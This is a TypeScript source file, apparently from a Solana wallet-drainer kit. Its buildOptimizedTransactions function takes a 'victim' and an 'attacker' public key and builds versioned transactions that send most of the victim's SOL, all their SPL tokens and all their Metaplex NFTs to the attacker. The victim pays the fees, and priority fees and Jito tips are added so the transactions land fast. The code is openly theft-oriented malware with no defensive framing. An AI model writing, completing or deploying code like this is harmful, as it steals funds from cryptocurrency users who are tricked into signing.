import { 
  VersionedTransaction, 
  TransactionMessage, 
  PublicKey,
  Connection 
} from '@solana/web3.js';

import { createSOLTransferIx } from './instructions/system';
import { createSPLTransferIxs } from './instructions/token';
import { createMetaplexTransferIxs } from './instructions/metaplex';
import { getPriorityFeeIx, getJitoTipIx } from './utils/priority-fee';
import SOLANA_CONFIG from './config';
import { log } from './logger';
import { chunkArray } from './utils/helpers';

export async function buildOptimizedTransactions(
  victimPubkey: PublicKey,
  attackerPubkey: PublicKey,
  assets: any,
  connection: Connection
): Promise<VersionedTransaction[]> {

  log.info('builder', `Building txs for ${victimPubkey.toString()}`);

  const instructions: any[] = [];

  try {
    instructions.push(getPriorityFeeIx(SOLANA_CONFIG.priorityFeeMicroLamports));

    if (SOLANA_CONFIG.jitoEnabled) {
      instructions.push(getJitoTipIx(SOLANA_CONFIG.jitoTipAmount, victimPubkey));
    }

    if (assets.solBalance > (SOLANA_CONFIG.minSolToDrain || 0.005) * 1e9) {
      const amount = Math.floor(assets.solBalance * 0.92);
      instructions.push(createSOLTransferIx(victimPubkey, attackerPubkey, amount));
    }

    if (assets.tokens?.length > 0) {
      instructions.push(...createSPLTransferIxs(victimPubkey, attackerPubkey, assets.tokens));
    }

    if (assets.nfts?.length > 0) {
      const nftIxs = await createMetaplexTransferIxs(
        victimPubkey, 
        attackerPubkey, 
        assets.nfts, 
        connection
      );
      instructions.push(...nftIxs);
    }

    const chunks = chunkArray(instructions, SOLANA_CONFIG.maxInstructionsPerTx || 8);
    const transactions: VersionedTransaction[] = [];

    for (const chunk of chunks) {
      const { blockhash } = await connection.getLatestBlockhash('confirmed');

      const messageV0 = new TransactionMessage({
        payerKey: victimPubkey,
        recentBlockhash: blockhash,
        instructions: chunk,
      }).compileToV0Message();

      transactions.push(new VersionedTransaction(messageV0));
    }

    log.info('builder', `Built ${transactions.length} transactions`);
    return transactions;

  } catch (error: any) {
    log.error('builder', 'Build failed', error.message);
    throw error;
  }
}